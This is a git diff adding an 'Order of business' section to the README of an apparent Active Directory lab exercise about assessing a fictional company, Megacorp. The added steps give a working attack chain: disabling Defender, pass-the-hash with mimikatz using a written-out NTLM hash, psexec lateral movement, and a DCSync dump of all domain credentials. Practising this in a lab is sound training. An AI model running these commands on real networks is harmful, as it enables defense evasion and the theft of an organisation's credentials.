@@ -8,6 +8,24 @@ Hi! If you find this project helpful, please consider giving it a star. Your sup
 
 ![Inside Job](.assets/InsideJob.jpg)
 
+## Order of business
+1. Get local admin rights
+2. Disable defender on local machine
+3. Download mimikatz
+4. Use mimikatz for pass the hash
+5. In the new shell: Confirm by `dir \\192.168.56.30\c$` or whatever the ip is
+6. `psexec /accepteula -r random_naam \\192.168.56.30 cmd`
+7. Confirm you're in by typing `hostname` in the shell
+8. Copy C drive to X drive to get mimikatz
+9. Do another pass the hash (get the ip with a scanner or something)
+10. Confirm you're in by `dir \\192.168.56.10\c$` or whatever the ip is
+11. ``sekurlsa::pth /user:domad /ntlm:cff48581d56085119bddffacfae51aeb /domain:adlab.local /run:cmd.exe`
+12. Open mimikatz on **YOUR LOCAL MACHINE** in the shell you just got. You are on a local machine, but have infinite rights.
+13. `privilege::debug`
+14. `lsadump::dcsync /domain:adlab.local /all /csv`
+15. I'M IN. ENHANCE THE FOOTAGE. I BROKE THEIR BABY FIREWALL. 
+
+
 ## Case
 
 Megacorp, a very large company, has recently acquired several SMEs (Small and Medium-sized Enterprises). Being highly risk-averse and serious about their security posture, Megacorp is conducting multiple simultaneous security assessments.
